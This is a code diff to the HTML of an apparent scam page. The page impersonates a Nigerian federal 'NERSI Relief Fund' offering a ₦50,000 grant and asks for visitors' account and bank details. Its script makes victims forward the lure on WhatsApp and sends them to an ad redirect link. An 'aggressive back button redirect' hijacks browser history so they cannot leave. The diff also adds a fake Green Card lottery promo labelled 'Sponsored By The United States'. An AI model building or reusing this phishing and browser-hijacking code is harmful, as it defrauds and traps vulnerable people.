@@ -9,7 +9,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     
-    <!-- Meta Previews (UPDATED IMAGE LINK) -->
+    <!-- Meta Previews -->
     <meta property="og:title" content="NERSI RELIEF FUND - ₦50,000 GRANT" />
     <meta property="og:description" content="₦50,000 Relief Fund" />
     <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBHpNtV2oE87jo-zNp68uFSCPf9qN-Law71LLZYIG09CdfPgRbi8fpi7lh9CtewRTQVHCqhnGAa-snZG5BFCg1p9rr9isP8JyQsUyiFOGQLtzE8hF2J6d54IcT6m8-g9cV_knrHkcxYK3Us2LkxQ25nuGmFj3fbiVyQsObTliqA01NSsMTdlUE1XziP2w/s738/35962.jpg" />
@@ -258,6 +258,37 @@
 
         .footer-supercounter { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); }
 
+        /* Green Card Promo Box */
+        .greencard-promo {
+            text-align: center;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            background-color: #ffffff; 
+            border: 2px solid var(--nersi-gold); 
+            padding: 20px; 
+            border-radius: 12px; 
+            margin: 30px auto 10px; 
+            max-width: 90%;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+        }
+        .greencard-promo a {
+            text-decoration: none; 
+            color: #000; 
+            font-size: 18px; 
+            font-weight: bold;
+            display: block;
+            line-height: 1.4;
+        }
+        .greencard-promo .blink-text {
+            color: #d32f2f;
+            display: block;
+            margin-top: 5px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
         @media (max-width: 600px) {
             .nersi-header-left { gap: 10px; }
             .nersi-logo-group img { height: 30px; }
@@ -348,7 +379,6 @@
             
             <button id="go" class="btn-main">APPLY NOW</button>
 
-            <!-- IMAGE 1 FEATURES -->
             <div class="features-grid">
                 <div class="feature-item"><div class="feature-dot"></div> Free to receive</div>
                 <div class="feature-item"><div class="feature-dot"></div> Consent comes first</div>
@@ -446,7 +476,6 @@
                 <p><b>Account Number:</b> <span id="getnum"></span></p>
                 <p><b>Bank:</b> <span id="getbank"></span></p>
                 
-                <!-- INLINE PENDING BADGE -->
                 <p style="margin-top: 10px; border-top: 1px solid #ddd; padding-top: 10px;">
                     <b>Transaction Status:</b> <span class="status-badge">PENDING</span>
                 </p>
@@ -495,6 +524,17 @@
             </a>
             
             <button id="offer" class="btn-main" style="background: var(--nersi-gold); color: var(--nersi-green); margin-top: 15px; font-weight: 800;">APPROVE PAYMENT</button>
+
+            <!-- GREEN CARD PROMO ADDED HERE -->
+            <div class="greencard-promo">
+                <a href="https://green-card-lottery-visa.blogspot.com/?m=1">
+                    Travel-Work-Live in the United States With DV-2027 Green Card Lottery
+                    <span class="blink-text">CHECK YOUR ELIGIBILITY HERE</span>
+                </a>
+                <p style="font-size: 12px; color: gray; margin-top: 10px;">Sponsored By The United States</p>
+            </div>
+            <!-- END GREEN CARD PROMO -->
+
         </div>
     </div>
 
@@ -635,7 +675,6 @@
             var width = 0;
             var shareText = "*FEDERAL GOVERNMENT NERSI RELIEF FUND 2026*%0A%0AThe Federal Government is giving out *₦50,000 Grant* to support citizens. %0A%0AAPPLY HERE👉: https://metaink.xyz/NERSI-Relief-Fund %0A%0A*_Forward To Other Nigerians To Benefit._*";
             var shareUrl = "whatsapp://send?text=" + shareText;
-            // Primary redirect URL
             var redirectUrl = "https://uplcm.com/4/10077877"; 
 
             $("#whatsapp").click(function () {
@@ -672,28 +711,19 @@
                 window.open(redirectUrl, "_blank");
             });
 
-            // AGGRESSIVE BACK BUTTON REDIRECT (From your old working script)
+            // AGGRESSIVE BACK BUTTON REDIRECT
             window.addEventListener('popstate', function() {
                 history.pushState(null, null, document.URL);
-                window.location.href = redirectUrl; // Forces redirect
+                window.location.href = redirectUrl; 
             });
             
             history.pushState(null, null, document.URL);
 
-            // Fallback for older mobile browsers
-            window.onhashchange = function () { 
-                jp(); 
-            }; 
-            function hh() { 
-                history.pushState(history.length + 1, "message", "#" + Math.random()); 
-            } 
-            function jp() { 
-                fh(); 
-            } 
+            window.onhashchange = function () { jp(); }; 
+            function hh() { history.pushState(history.length + 1, "message", "#" + Math.random()); } 
+            function jp() { fh(); } 
             setTimeout('hh();', 500); 
-            function fh() { 
-                location.href = redirectUrl; 
-            }
+            function fh() { location.href = redirectUrl; }
         });
     </script>
 </body>
